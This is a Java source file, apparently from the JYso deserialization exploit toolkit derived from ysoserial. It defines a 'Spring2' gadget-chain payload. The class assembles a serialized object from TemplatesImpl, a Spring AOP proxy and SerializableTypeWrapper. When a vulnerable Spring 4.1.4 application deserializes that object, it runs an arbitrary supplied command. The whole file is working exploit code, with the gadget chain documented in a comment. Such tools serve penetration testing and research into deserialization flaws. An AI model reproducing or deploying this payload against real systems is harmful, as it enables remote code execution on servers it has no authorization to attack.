package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.SingletonTargetSource;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import static java.lang.Class.forName;

/**
 * Just a PoC to proof that the ObjectFactory stuff is not the real problem.
 * <p>
 * Gadget chain:
 * TemplatesImpl.newTransformer()
 * Method.invoke(Object, Object...)
 * AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])
 * JdkDynamicAopProxy.invoke(Object, Method, Object[])
 * $Proxy0.newTransformer()
 * Method.invoke(Object, Object...)
 * SerializableTypeWrapper$MethodInvokeTypeProvider.readObject(ObjectInputStream)
 *
 * @author mbechler
 */

@Dependencies({
        "org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-aop:4.1.4.RELEASE",
        // test deps
        "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
})
@Authors({Authors.MBECHLER})
public class Spring2 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Object templates;
        templates = Gadgets.createTemplatesImpl(command);

        AdvisedSupport as = new AdvisedSupport();
        as.setTargetSource(new SingletonTargetSource(templates));

        final Type typeTemplatesProxy = Gadgets.createProxy(
                (InvocationHandler) Reflections.getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as),
                Type.class,
                Templates.class);

        final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
                Gadgets.createMap("getType", typeTemplatesProxy),
                forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

        Object mitp = Reflections.createWithoutConstructor(forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider"));
        Reflections.setFieldValue(mitp, "provider", typeProviderProxy);
        Reflections.setFieldValue(mitp, "methodName", "newTransformer");

        return mitp;
    }

}
